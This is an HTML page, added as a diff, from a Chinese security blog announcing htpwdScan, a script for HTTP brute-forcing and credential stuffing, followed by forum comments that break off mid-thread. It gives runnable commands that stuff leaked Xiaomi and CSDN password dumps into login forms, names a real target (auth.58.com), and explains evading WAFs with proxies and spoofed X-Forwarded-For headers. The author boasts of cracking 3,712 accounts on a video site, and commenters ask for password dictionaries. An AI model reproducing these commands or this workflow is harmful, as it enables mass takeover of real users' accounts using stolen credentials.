@@ -1,0 +1,1360 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="lijiejie" /><meta name="description" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本。htpwdScan 是一个简单的HTTP暴力破解、撞库攻击脚本：1. 支持批量校验并导入HTTP代理，低频撞库可以成功攻击大部分网站，绕过大部分防御策略和waf。2. 支持直接导入互联网上泄露的社工库，发起撞库攻击。3. 支持导入超大字典。4. 其他细微功能：随机X-Forwarded-For、随机SessionID，支持Basic Auth，支持MD5 Hash等。下面是几个简单示例。" />
+<meta name="keywords" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/4524/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本" />
+<meta property="og:description" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本。htpwdScan 是一个简单的HTTP暴力破解、撞库攻击脚本：1. 支持批量校验并导入HTTP代理，低频撞库可以成功攻击大部分网站，绕过大部分防御策略和waf。2. 支持直接导入互联网上泄露的社工库，发起撞库攻击。3. 支持导入超大字典。4. 其他细微功能：随机X-Forwarded-For、随机SessionID，支持Basic Auth，支持MD5 Hash等。下面是几个简单示例。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/4524/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2015-04-24T14:19:16&#43;08:00" />
+<meta property="article:modified_time" content="2015-04-24T14:19:16&#43;08:00" />
+
+<meta itemprop="name" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本">
+<meta itemprop="description" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本。htpwdScan 是一个简单的HTTP暴力破解、撞库攻击脚本：1. 支持批量校验并导入HTTP代理，低频撞库可以成功攻击大部分网站，绕过大部分防御策略和waf。2. 支持直接导入互联网上泄露的社工库，发起撞库攻击。3. 支持导入超大字典。4. 其他细微功能：随机X-Forwarded-For、随机SessionID，支持Basic Auth，支持MD5 Hash等。下面是几个简单示例。"><meta itemprop="datePublished" content="2015-04-24T14:19:16&#43;08:00" />
+<meta itemprop="dateModified" content="2015-04-24T14:19:16&#43;08:00" />
+<meta itemprop="wordCount" content="4016">
+<meta itemprop="keywords" content="HTTP,暴力,攻击,脚本,批量,破解,bug,CSDN,IE,IP,MD5,NDS,Net,PHP,POS,QQ,代理,密码,社工,数据,网站,文件,问题,字典," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本"/>
+<meta name="twitter:description" content="htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本。htpwdScan 是一个简单的HTTP暴力破解、撞库攻击脚本：1. 支持批量校验并导入HTTP代理，低频撞库可以成功攻击大部分网站，绕过大部分防御策略和waf。2. 支持直接导入互联网上泄露的社工库，发起撞库攻击。3. 支持导入超大字典。4. 其他细微功能：随机X-Forwarded-For、随机SessionID，支持Basic Auth，支持MD5 Hash等。下面是几个简单示例。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">htpwdScan -- 一个简单的批量HTTP暴力破解、撞库攻击脚本</h1>
+      
+      <div class="post-meta">
+        <time datetime="2015-04-24" class="post-time">
+          2015-04-24
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/http/"> HTTP </a>
+            <a href="https://lcx.cc/categories/%E6%9A%B4%E5%8A%9B/"> 暴力 </a>
+            <a href="https://lcx.cc/categories/%E6%94%BB%E5%87%BB/"> 攻击 </a>
+            <a href="https://lcx.cc/categories/%E8%84%9A%E6%9C%AC/"> 脚本 </a>
+            <a href="https://lcx.cc/categories/%E6%89%B9%E9%87%8F/"> 批量 </a>
+            <a href="https://lcx.cc/categories/%E7%A0%B4%E8%A7%A3/"> 破解 </a>
+            
+          </div>
+        <span class="more-meta"> 约 4016 字 </span>
+          <span class="more-meta"> 预计阅读 9 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	htpwdScan -- 一个简单的HTTP暴力破解、撞库攻击脚本
+</p>
+<p style="text-indent:2em;">
+	lijiejie | 2015-04-23 17:46
+</p>
+<p style="text-indent:2em;">
+	htpwdScan 是一个简单的HTTP暴力破解、撞库攻击脚本：
+</p>
+<p style="text-indent:2em;">
+	1. 支持批量校验并导入HTTP代理，低频撞库可以成功攻击大部分网站，绕过大部分防御策略和waf
+</p>
+<p style="text-indent:2em;">
+	2. 支持直接导入互联网上泄露的社工库，发起撞库攻击
+</p>
+<p style="text-indent:2em;">
+	3. 支持导入超大字典
+</p>
+<p style="text-indent:2em;">
+	4. 其他细微功能：随机X-Forwarded-For、随机SessionID，支持Basic Auth，支持MD5 Hash等
+</p>
+<p style="text-indent:2em;">
+	下面是几个简单示例
+</p>
+<p style="text-indent:2em;">
+	<strong>HTTP Basic认证</strong> 
+</p>
+<pre class="prettyprint">htpwdScan.py -u=http://auth.58.com/ -basic user.txt password.txt</pre>
+<p style="text-indent:2em;">
+	导入用户名密码字典即可
+</p>
+<p style="text-indent:2em;">
+	<strong>表单破解</strong> 
+</p>
+<pre class="prettyprint">htpwdScan.py -f post2.txt -d passwd=password.txt -err="success\":false"</pre>
+<p style="text-indent:2em;">
+	从 post2.txt 导入抓的http包，passwd是需要破解的参数，而password.txt是保存了密码的字典文件
+</p>
+<p style="text-indent:2em;">
+	success":false 是选择的失败标记，标记中若有双引号，请记得用右斜杠 \ 转义
+</p>
+<p style="text-indent:2em;">
+	<strong>GET参数破解</strong> 
+</p>
+<pre class="prettyprint">htpwdScan.py -d passwd=password.txt -u="http://xxx.com/inside.php?m=login&amp;username=test&amp;passwd=test" -get -err="success\":false"</pre>
+<p style="text-indent:2em;">
+	使用-get参数告诉脚本此处是GET请求
+</p>
+<p style="text-indent:2em;">
+	<strong>撞库攻击</strong> 
+</p>
+<pre class="prettyprint">htpwdScan.py -f=post.txt -database loginname,passwd=xiaomi.txt -regex="(\S+)\s+(\S+)" -err="用户名或密码错误" -fip
+htpwdScan.py -f=post.txt -database passwd,loginname=csdn.net.sql -regex="\S+ # (\S+) # (\S+)" -err="用户名或密码错误" -fip</pre>
+<p style="text-indent:2em;">
+	使用小米和csdn库发起撞库攻击。post.txt是抓包的HTTP请求
+</p>
+<p style="text-indent:2em;">
+	参数-regex设定从文件提取参数的正则表达式，此处需分组，分组的方式是使用括号()
+</p>
+<p style="text-indent:2em;">
+	小米的数据行格式是 xxx@163.com xxxxxxx 也即 (用户名)空白字符(密码)
+</p>
+<p style="text-indent:2em;">
+	(\S+)\s+(\S+) 指定第一个非空白字符拿去填充loginname，而第二个非空白字符串拿去填充passwd
+</p>
+<p style="text-indent:2em;">
+	csdn的数据行格式是zdg # 12344321 # zdg@csdn.net . 正则表达式写作\S+ # (\S+) # (\S+)
+</p>
+<p style="text-indent:2em;">
+	第一个#后面的非空白字符串填充passwd，第二个#后面的非空白字符串填充loginname
+</p>
+<p style="text-indent:2em;">
+	请注意，参数的顺序是重要的
+</p>
+<p style="text-indent:2em;">
+	<strong>校验HTTP代理</strong> 
+</p>
+<pre class="prettyprint">htpwdScan.py -f=post.txt -proxylist=proxies.txt -checkproxy -suc="用户名或密码错误"</pre>
+<p style="text-indent:2em;">
+	要破解某个网站，批量测试使用代理是否连通目标网站，把HTTP请求保存到post.txt，然后用-suc参数设定连通标记
+</p>
+<p style="text-indent:2em;">
+	一个简单可行的校验方式是：
+</p>
+<pre class="prettyprint">htpwdScan.py -u=http://www.baidu.com -get -proxylist=available.txt -checkproxy -suc="百度一下"</pre>
+<p style="text-indent:2em;">
+	<strong>完整参数说明</strong> 
+</p>
+<p style="text-indent:2em;">
+	脚本支持的小功能较多，请耐心阅读以下以下完整说明。建议多使用 -debug 参数查看HTTP请求是否有问题，没问题再发起真正的破解。
+</p>
+<pre class="prettyprint">usage: htpwdScan.py [options]
+
+* An HTTP weak pass scanner. By LiJieJie *
+
+optional arguments:
+  -h, --help            显示帮助
+
+Target:
+  -u REQUESTURL         设定目标URL, 示例.
+                        -u="https://www.test.com/login.php"
+  -f REQUESTFILE        从文件导入HTTP请求
+  -https                当从文件导入HTTP请求时，启用https(SSL)
+  -get                  使用GET方法，默认: POST
+  -basic  [ ...]        HTTP Basic 暴力破解.
+                        示例. -basic users.dic pass.dic
+
+Dictionary:
+  -d Param=DictFile [Param=DictFile ...]
+                        为参数设定字典文件,
+                        支持哈希函数如 md5, md5_16, sha1.
+                        示例. -d user=users.dic pass=md5(pass.dic)
+
+Detect:
+  -no302                无视302跳转, 默认302敏感
+  -err ERR [ERR ...]    响应文本的破解失败标记,
+                        示例. -err "user not exist" "password wrong"
+  -suc SUC [SUC ...]    响应文本中的破解成功标记,
+                        e.g. -suc "welcome," "admin"
+  -herr HERR            响应HTTP头的破解失败标记
+  -hsuc HSUC            响应HTTP头的破解成功标记
+  -rtxt RetryText       响应文本中的重试标记，出现则重试请求,
+                        示例. -rtxt="IP blocked"
+  -rntxt RetryNoText    响应文本中的重试标记,出现则重试请求，
+                        示例. -rntxt="&lt;body&gt;"
+  -rheader RetryHeader  响应头中的重试标记，出现则重试请求,
+                        示例. -rheader="Set-Cookie:"
+  -rnheader RetryNoHeader
+                        响应头中的重试标记，未出现则重试请求,
+                        e.g. -rheader="HTTP/1.1 200 OK"
+
+Proxy and spoof:
+  -proxy Server:Port    设定少量HTTP代理
+                        示例. -proxy=127.0.0.1:8000,8.8.8.8:8000
+  -proxylist ProxyListFile
+                        从文件批量导入HTTP代理,
+                        e.g. -proxylist=proxys.txt
+  -checkproxy           检查代理服务器的可用性.
+                        可用代理输出到 001.proxy.servers.txt
+  -fip                  随机random X-Forwarded-For欺骗源IP
+  -fsid FSID            生成随机session ID. 示例. -fsid PHPSESSID
+  -sleep SECONDS        每次HTTP结束，等待SECONDS秒,
+                        避免IP被临时屏蔽，进入黑名单
+
+Database attack:
+  -database DATABASE    导入社工库中的数据.
+                        e.g. -database user,pass=csdn.txt
+  -regex REGEX          从社工库中提取数据的字符串，必须分组.
+                        e.g. -regex="(\S+)\s+(\S+)"
+
+General:
+  -t THREADS            工作线程数，默认50
+  -o OUTPUT             输出文件.  默认: 000.Cracked.Passwords.txt
+  -debug                进入debug mode检查HTTP请求和HTTP响应
+  -nov                  只显示破解成功的条目，不显示进度
+  -v                    show program's version number and exit</pre>
+<p style="text-indent:2em;">
+	<strong>反馈</strong> 
+</p>
+<p style="text-indent:2em;">
+	使用中若发现问题，请反馈给我。 my[at]lijiejie.com http://www.lijiejie.com
+</p>
+<p style="text-indent:2em;">
+	获取脚本：<a href="https://github.com/lijiejie/htpwdScan" target="_blank">https://github.com/lijiejie/htpwdScan</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="http://zone.wooyun.org/content/19964" target="_blank">[原文地址]</a> 
+</p>
+<p>
+	<strong>相关内容：</strong> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4498/" target="_blank">讨论：如何在网络上保护个人隐私？互联网时代的隐私泄露与安全保护？</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4327/" target="_blank">对小米论坛泄露数据的一次分析 密码成功破解率高达37.8%</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4323/" target="_blank">讨论：因为这次小米信息泄漏事件，总结一下数据泄漏造成的危害</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4313/" target="_blank">中航信系统漏洞泄露乘客信息，查询任意航班乘机人姓名,航班号,身份证,手机号</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4278/" target="_blank">Angry Birds和广告系统泄露个人信息——FireEye对Angry Birds的分析</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4269/" target="_blank">小米手机客户资料泄露了吗？冒充小米售后回访诈骗电话：01053799231</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4239/" target="_blank">发个社工福利站，搜库 - 密码泄露查询，社工库，泄露密码查询库</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4238/" target="_blank">揭露一个飞机退改签的诈骗：借口机票退改签要退款，索要银行卡号，套取个人信息</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4229/" target="_blank">京东惨招恶意炒作，数据库泄露为撞库攻击</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4185/" target="_blank">2000万条酒店开房数据泄露 男子婚事被搅黄</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4148/" target="_blank">开房数据泄露案告破 警方发现嫌犯曾参与多起网络犯罪</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/4033/" target="_blank">京东 淘宝 天猫订单信息泄露诈骗, 接到“京东”的客服电话之后遭遇团伙诈骗</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3980/" target="_blank">adobe 1.5亿泄露数据 密码算法逆向挑战</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3874/" target="_blank">怪异！10086短信接口泄露？10086发博彩、赌博短信</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3813/" target="_blank">病患信息遭泄露 骗子假扮医生短信要红包</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3753/" target="_blank">腾讯泄露隐私？看卫士哥获得女神的好友的名单，社工可能认识的人！</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3674/" target="_blank">Carberp源代码泄露后续——黑掉黑客</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3541/" target="_blank">DNS域传送信息泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3529/" target="_blank">如何抵御社工库类的黑客攻击？在明文密码已泄露的情况下保护自己？</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3463/" target="_blank">关机后仍能提取出内存中的关键信息，计算机关闭后内存数据泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/3422/" target="_blank">中国电信ADSL宽带信息泄露,可查任意IP对应的宽带账号,电话号码,上门砍人</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2868/" target="_blank">某些搜索引擎超科幻搜索结果，泄露了不只一点点 </a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2844/" target="_blank">King Of The Proxy (代理之王) v1.0 发布、HTTP代理采集、验证工具</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2467/" target="_blank">盗刷京东客户资金 4人被抓 客户信息外流 源自去年底数据库泄密事件</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2450/" target="_blank">苹果欲建造内部食堂 防止保密信息泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2350/" target="_blank">当当网再爆泄密事件 紧急冻结所有账户余额</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2326/" target="_blank">美国色情网站遭黑客袭击 7.3万用户资料泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2292/" target="_blank">Mydecms 贤诚文章管理系统泄露数据库账号、密码、库名漏洞</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2127/" target="_blank">互联网信息办公布用户信息泄露事件查处情况</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2116/" target="_blank">2012年新浪微博用户密码泄露漏洞（图片解析）</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2089/" target="_blank">目前我认为是2011密码泄露事件最合理、最符合实际的一个解释</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/1828/" target="_blank">索尼又遭黑客攻击 或致9万余份用户信息泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/1575/" target="_blank">美国军方遭黑客袭击 泄露大量秘密信息</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/1501/" target="_blank">艺电称旗下一网站遭攻击 用户资料泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/1119/" target="_blank">囧事 知名反病毒厂商卡巴斯基源代码泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/1004/" target="_blank">【文章】8.9 泄露密钥 对称密码 私/密钥泄露</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/975/" target="_blank">【文章】4.13 秘密的全或无泄露 ANDOS协议</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/554/" target="_blank">【漏洞】Microsoft IE CSS处理跨域信息泄露</a> 
+</p>
+<p>
+	<strong>各种吐槽：</strong> 
+</p>
+<p style="text-indent:2em;">
+	1#
+</p>
+<p style="text-indent:2em;">
+	老笨蛋 | 2015-04-23 17:50
+</p>
+<p style="text-indent:2em;">
+	大婶出新货了，赞。
+</p>
+<p style="text-indent:2em;">
+	2#
+</p>
+<p style="text-indent:2em;">
+	hkAssassin | 2015-04-23 18:15
+</p>
+<p style="text-indent:2em;">
+	大婶出新货了，赞。
+</p>
+<p style="text-indent:2em;">
+	3#
+</p>
+<p style="text-indent:2em;">
+	Mody | 2015-04-23 18:17
+</p>
+<p style="text-indent:2em;">
+	大婶出新货了，赞。
+</p>
+<p style="text-indent:2em;">
+	4#
+</p>
+<p style="text-indent:2em;">
+	nony (Not do is die...) | 2015-04-23 18:21
+</p>
+<p style="text-indent:2em;">
+	多线程撞库啊
+</p>
+<p style="text-indent:2em;">
+	5#
+</p>
+<p style="text-indent:2em;">
+	lijiejie | 2015-04-23 18:24
+</p>
+<p style="text-indent:2em;">
+	<img title="撞库攻击某视频网站，238秒破解成功账号3712个。" alt="撞库攻击某视频网站，238秒破解成功账号3712个。" src="/file/old/4608_1.png" width="677" height="570" /> 
+</p>
+<p style="text-indent:2em;">
+	撞库攻击某视频网站，238秒破解成功账号3712个。
+</p>
+<p style="text-indent:2em;">
+	6#
+</p>
+<p style="text-indent:2em;">
+	浅蓝 (摸摸大) | 2015-04-23 18:28
+</p>
+<p style="text-indent:2em;">
+	大婶出新货了，赞。
+</p>
+<p style="text-indent:2em;">
+	7#
+</p>
+<p style="text-indent:2em;">
+	zph | 2015-04-23 18:29
+</p>
+<p style="text-indent:2em;">
+	太牛逼了，赞
+</p>
+<p style="text-indent:2em;">
+	8#
+</p>
+<p style="text-indent:2em;">
+	刘海哥 (‮moc.ghuil.www) | 2015-04-23 18:38
+</p>
+<p style="text-indent:2em;">
+	太牛逼了，赞
+</p>
+<p style="text-indent:2em;">
+	9#
+</p>
+<p style="text-indent:2em;">
+	Skull ((‮data;)) | 2015-04-23 18:46
+</p>
+<p style="text-indent:2em;">
+	字典应该在放出来啊
+</p>
+<p style="text-indent:2em;">
+	10#
+</p>
+<p style="text-indent:2em;">
+	小胖子 (z7y首席代言人，园长的表哥...) | 2015-04-23 19:07
+</p>
+<p style="text-indent:2em;">
+	嗯，以后众测又会有很多人刷撞库攻击了。@zeracker
+</p>
+<p style="text-indent:2em;">
+	11#
+</p>
+<p style="text-indent:2em;">
+	Gnest (乌云首席酱油哥) | 2015-04-23 19:36
+</p>
+<p style="text-indent:2em;">
+	姐姐，么么哒。
+</p>
+<p style="text-indent:2em;">
+	12#
+</p>
+<p style="text-indent:2em;">
+	Well (男神提枪逛青楼。) | 2015-04-23 19:57
+</p>
+<p style="text-indent:2em;">
+	姐姐我想给你生娃。。。
+</p>
+<p style="text-indent:2em;">
+	13#
+</p>
+<p style="text-indent:2em;">
+	’‘Nome (&lt;&gt;?:"{}!%^#&amp;*看出啥来了?) | 2015-04-23 20:05
+</p>
+<p style="text-indent:2em;">
+	李洁杰.......哥 谢谢了~ 感谢你的无私奉献
+</p>
+<p style="text-indent:2em;">
+	14#
+</p>
+<p style="text-indent:2em;">
+	小龙 | 2015-04-23 20:08
+</p>
+<p style="text-indent:2em;">
+	太牛逼了，赞,我的草榴账号又有希望了，撸主别哭，站起来撸
+</p>
+<p style="text-indent:2em;">
+	15#
+</p>
+<p style="text-indent:2em;">
+	sin (求实习) | 2015-04-23 21:15
+</p>
+<p style="text-indent:2em;">
+	另外前端放个tor之类的代理池，几分钟刷新下ip
+</p>
+<p style="text-indent:2em;">
+	16#
+</p>
+<p style="text-indent:2em;">
+	咖啡 (来自iPhone6s土豪金客户端 | 1分钟前 迪拜帆船酒店 总统套房) | 2015-04-23 21:30
+</p>
+<p style="text-indent:2em;">
+	收藏， 分享下字典就更好了
+</p>
+<p style="text-indent:2em;">
+	17#
+</p>
+<p style="text-indent:2em;">
+	’‘Nome (&lt;&gt;?:"{}!%^#&amp;*看出啥来了?) | 2015-04-23 21:33
+</p>
+<p style="text-indent:2em;">
+	@咖啡 用泄漏的裤子进行撞裤
+</p>
+<p style="text-indent:2em;">
+	18#
+</p>
+<p style="text-indent:2em;">
+	MeirLin (我需要AV(安慰)) | 2015-04-23 22:21
+</p>
+<p style="text-indent:2em;">
+	有token有办法么
+</p>
+<p style="text-indent:2em;">
+	19#
+</p>
+<p style="text-indent:2em;">
+	→Ｈack涛 | 2015-04-23 22:57
+</p>
+<p style="text-indent:2em;">
+	前提你要有个给你撞库的地址，第二你需要社工库！第三就是我不会用求教程
+</p>
+<p style="text-indent:2em;">
+	20#
+</p>
+<p style="text-indent:2em;">
+	Jumbo | 2015-04-23 23:29
+</p>
+<p style="text-indent:2em;">
+	支持哈希函数如 md5, md5_16, sha1.这个给力
+</p>
+<p style="text-indent:2em;">
+	21#
+</p>
+<p style="text-indent:2em;">
+	动后河 (类的继承) | 2015-04-23 23:34
+</p>
+<p style="text-indent:2em;">
+	判断登录成功与否方式太单一了，还可以加两个
+</p>
+<p style="text-indent:2em;">
+	1. 重定向与否
+</p>
+<p style="text-indent:2em;">
+	2. 返回数据长度
+</p>
+<p style="text-indent:2em;">
+	22#
+</p>
+<p style="text-indent:2em;">
+	her0ma | 2015-04-23 23:43
+</p>
+<p style="text-indent:2em;">
+	我想知道撞58的成功了吗？
+</p>
+<p style="text-indent:2em;">
+	23#
+</p>
+<p style="text-indent:2em;">
+	her0ma | 2015-04-23 23:47
+</p>
+<p style="text-indent:2em;">
+	@lijiejie 前两天某天下午开发反馈说我们的系统有异常，我看了半天日志没发现啥问题，是你撞的么？我再翻看看日志记录
+</p>
+<p style="text-indent:2em;">
+	24#
+</p>
+<p style="text-indent:2em;">
+	炯炯虾 | 2015-04-23 23:54
+</p>
+<p style="text-indent:2em;">
+	也不显示扫描进度 谁知道扫了多少
+</p>
+<p style="text-indent:2em;">
+	25#
+</p>
+<p style="text-indent:2em;">
+	狗狗侠 | 2015-04-24 00:54
+</p>
+<p style="text-indent:2em;">
+	撞58妥妥的
+</p>
+<p style="text-indent:2em;">
+	26#
+</p>
+<p style="text-indent:2em;">
+	MeirLin (我需要AV(安慰)) | 2015-04-24 01:03
+</p>
+<p style="text-indent:2em;">
